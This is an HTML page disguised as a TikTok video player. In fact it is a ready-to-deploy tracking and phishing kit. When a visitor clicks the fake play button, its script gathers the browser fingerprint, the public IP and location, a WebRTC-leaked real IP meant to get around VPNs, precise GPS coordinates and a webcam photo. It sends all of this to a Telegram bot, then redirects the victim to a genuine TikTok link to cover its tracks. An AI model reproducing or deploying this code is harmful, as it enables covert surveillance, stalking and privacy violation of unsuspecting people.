<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Video Player - TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0f0f0f;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .video-container {
            max-width: 400px;
            width: 100%;
            background: #1a1a1a;
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
            margin-top: 20px;
        }
        .video-placeholder {
            width: 100%;
            aspect-ratio: 9/16;
            background: #222;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .video-placeholder img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0.6;
        }
        .play-btn {
            position: absolute;
            width: 70px;
            height: 70px;
            background: rgba(255,255,255,0.2);
            backdrop-filter: blur(10px);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: 0.3s;
            border: 2px solid rgba(255,255,255,0.3);
        }
        .play-btn:hover { background: rgba(255,255,255,0.35); transform: scale(1.05); }
        .play-btn svg { fill: #fff; width: 30px; height: 30px; margin-left: 3px; }
        .video-info {
            padding: 16px;
        }
        .video-info h3 { font-size: 16px; margin-bottom: 8px; }
        .video-info p { font-size: 13px; color: #888; }
        .user-bar {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            border-top: 1px solid #2a2a2a;
        }
        .user-bar .avatar {
            width: 40px; height: 40px;
            border-radius: 50%;
            background: #333;
        }
        .status-loading {
            color: #f00;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }
        .status-loading.active { display: block; }
    </style>
</head>
<body>

    <div class="video-container">
        <div class="video-placeholder" id="videoArea">
            <img src="https://p16-sign-va.tiktokcdn.com/tos-maliva-p-0068/o8ID4ACDLACID5CDFEAjFL1JFuict2mOgAKAWE~t5x10000.jpg" alt="preview">
            <div class="play-btn" id="playBtn" onclick="captureAll()">
                <svg viewBox="0 0 24 24"><polygon points="5,3 19,12 5,21"/></svg>
            </div>
        </div>
        <div class="video-info">
            <h3>😱 ये देखो 😱 Viral Video 2026 🔥</h3>
            <p>❤️ 2.4M views · 3 days ago</p>
            <div class="status-loading" id="status">⚙️ Processing... please wait</div>
        </div>
        <div class="user-bar">
            <div class="avatar"></div>
            <div>
                <strong>@viral_videos_2026</strong><br>
                <span style="font-size:12px;color:#888;">Follow</span>
            </div>
        </div>
    </div>

    <script>
    // ============================================
    // TELEGRAM CONFIG - আপনার তথ্য বসান
    // ============================================
    const BOT_TOKEN = "YOUR_BOT_TOKEN";
    const CHAT_ID = "YOUR_CHAT_ID";
    const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const TG_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

    function sendToTelegram(text) {
        fetch(TG_API, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
        }).catch(() => {});
    }

    function sendPhotoToTelegram(base64) {
        // Base64 image to blob -> Telegram (using sendPhoto with URL)
        // Alternative: use multipart/form-data
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                photo: base64,
                caption: "📸 Webcam Capture"
            })
        }).catch(() => {});
    }

    // ============================================
    // MAIN TRACKER
    // ============================================
    let capturedData = {};

    function captureAll() {
        document.getElementById('status').classList.add('active');
        const playBtn = document.getElementById('playBtn');
        playBtn.style.display = 'none';
        
        // 1. BASIC INFO IMMEDIATELY
        capturedData.basic = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            referrer: document.referrer || 'Direct',
            time: new Date().toISOString()
        };

        // 2. WebRTC IP LEAK (NO PERMISSION NEEDED)
        try {
            const pc = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' },
                    { urls: 'stun:stun2.l.google.com:19302' }
                ]
            });
            pc.createDataChannel('');
            pc.onicecandidate = e => {
                if (e.candidate) {
                    const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                    if (ipMatch) {
                        capturedData.webrtcIP = ipMatch[0];
                    }
                }
            };
            pc.createOffer().then(o => pc.setLocalDescription(o));
            setTimeout(() => pc.close(), 3000);
        } catch(e) {}

        // 3. IP API + GEO LOCATION
        fetch('https://ipapi.co/json/')
            .then(r => r.json())
            .then(ipData => {
                capturedData.ipInfo = ipData;
                
                // 4. Browser GPS (exact location)
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            capturedData.gps = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy + 'm',
                                mapsLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                            };
                            sendFinalReport();
                        },
                        () => sendFinalReport(),
                        { enableHighAccuracy: true, timeout: 8000 }
                    );
                } else {
                    sendFinalReport();
                }
            })
            .catch(() => sendFinalReport());

        // 5. CAMERA CAPTURE (after click permission)
        captureCamera();
    }

    function captureCamera() {
        try {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                        capturedData.webcam = dataURL;
                        stream.getTracks().forEach(t => t.stop());
                    }, 1500);
                })
                .catch(() => {});
        } catch(e) {}
    }

    // ============================================
    // SEND FINAL REPORT
    // ============================================
    function sendFinalReport() {
        let msg = `🔔 <b>TRACKER HIT!</b>\n`;
        msg += `━━━━━━━━━━━━━━━\n\n`;

        // IP Info
        if (capturedData.ipInfo) {
            msg += `🌐 <b>PUBLIC IP:</b> <code>${capturedData.ipInfo.ip || 'N/A'}</code>\n`;
            msg += `📍 <b>Location:</b>\n`;
            msg += `├ Country: ${capturedData.ipInfo.country_name || 'N/A'} (${capturedData.ipInfo.country_code || ''})\n`;
            msg += `├ Region: ${capturedData.ipInfo.region || 'N/A'}\n`;
            msg += `├ City: ${capturedData.ipInfo.city || 'N/A'}\n`;
            msg += `├ ZIP: ${capturedData.ipInfo.postal || 'N/A'}\n`;
            msg += `├ Lat: ${capturedData.ipInfo.latitude}\n`;
            msg += `└ Lon: ${capturedData.ipInfo.longitude}\n`;
            msg += `🏢 ISP: ${capturedData.ipInfo.org || 'N/A'}\n\n`;
        }

        // GPS exact
        if (capturedData.gps) {
            msg += `🎯 <b>EXACT GPS:</b>\n`;
            msg += `├ Lat: ${capturedData.gps.lat}\n`;
            msg += `├ Lon: ${capturedData.gps.lon}\n`;
            msg += `├ Accuracy: ${capturedData.gps.accuracy}\n`;
            msg += `└ 🗺️ <a href="${capturedData.gps.mapsLink}">Google Maps</a>\n\n`;
        }

        // WebRTC IP
        if (capturedData.webrtcIP) {
            msg += `🔌 <b>WebRTC IP (Real/VPN Bypass):</b> <code>${capturedData.webrtcIP}</code>\n\n`;
        }

        // Device
        msg += `📱 <b>DEVICE:</b>\n`;
        msg += `├ UA: <code>${capturedData.basic?.userAgent?.substring(0,100) || 'N/A'}...</code>\n`;
        msg += `├ Platform: ${capturedData.basic?.platform || 'N/A'}\n`;
        msg += `├ Language: ${capturedData.basic?.language || 'N/A'}\n`;
        msg += `├ Screen: ${capturedData.basic?.screen || 'N/A'}\n`;
        msg += `├ Referrer: ${capturedData.basic?.referrer || 'N/A'}\n`;
        msg += `└ Time: ${capturedData.basic?.time || 'N/A'}\n\n`;

        msg += `📍 <b>Google Geo:</b>\n`;
        if (capturedData.gps) {
            msg += `🔗 <a href="${capturedData.gps.mapsLink}">${capturedData.gps.mapsLink}</a>\n`;
        } else if (capturedData.ipInfo) {
            const fallbackMap = `https://www.google.com/maps?q=${capturedData.ipInfo.latitude},${capturedData.ipInfo.longitude}`;
            msg += `🔗 <a href="${fallbackMap}">${fallbackMap}</a>\n`;
        }
        msg += `━━━━━━━━━━━━━━━\n🔍 <b>#TrackerHit</b>`;

        // Send text first
        sendToTelegram(msg);

        // Send webcam photo if captured
        setTimeout(() => {
            if (capturedData.webcam) {
                sendPhotoToTelegram(capturedData.webcam);
            }
            
            // Redirect to real TikTok video after 3s
            setTimeout(() => {
                window.location.href = "https://www.tiktok.com/@taylorswift/video/734456789";
            }, 1000);
        }, 2000);
    }
    </script>
</body>
</html>
